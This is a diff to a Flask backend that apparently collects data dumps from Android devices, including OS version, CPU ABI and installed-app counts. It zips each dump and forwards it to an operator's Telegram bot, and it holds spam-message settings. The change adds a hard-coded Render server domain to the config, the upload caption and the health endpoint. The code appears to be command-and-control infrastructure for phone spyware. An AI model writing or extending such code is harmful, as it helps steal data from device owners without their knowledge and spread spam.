@@ -30,6 +30,8 @@ SPAM_MESSAGE  = os.getenv(
 )
 SPAM_INTERVAL = float(os.getenv("SPAM_INTERVAL", "1.0"))
 
+SERVER_DOMAIN = os.getenv("SERVER_DOMAIN", "backend-2-3-580p.onrender.com")
+
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 DUMPS = Path(os.getenv("DUMPS_DIR", "/tmp/dumps"))
@@ -175,6 +177,7 @@ def route_config():
         "spam_message":  SPAM_MESSAGE,
         "spam_interval": SPAM_INTERVAL,
         "server":        "render",
+        "domain":        SERVER_DOMAIN,
     }), 200
 
 
@@ -228,7 +231,8 @@ def route_upload():
         f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
         f"ABI:     {info.get('cpu_abi','-')}\n"
         f"Apps:    {len(info.get('installed_apps', []))}\n"
-        f"```"
+        f"```\n"
+        f"🌐 https://{SERVER_DOMAIN}/health"
     )
     tg_send_document(zip_path, caption=caption)
     return jsonify({"ok": True, "stamp": stamp}), 200
@@ -275,7 +279,11 @@ def route_clients():
 
 @app.route("/health", methods=["GET"])
 def route_health():
-    return jsonify({"ok": True, "dumps": len(list(DUMPS.iterdir()))}), 200
+    return jsonify({
+        "ok": True,
+        "dumps": len(list(DUMPS.iterdir())),
+        "domain": SERVER_DOMAIN,
+    }), 200
 
 
 @app.route("/", methods=["GET"])
@@ -284,7 +292,7 @@ def route_index():
 
 
 # ═══════════════════════════════════════
-#  СТАРТ БОТ-ПОТОКА (важно для gunicorn)
+#  СТАРТ БОТ-ПОТОКА
 # ═══════════════════════════════════════
 
 _bot_thread = None
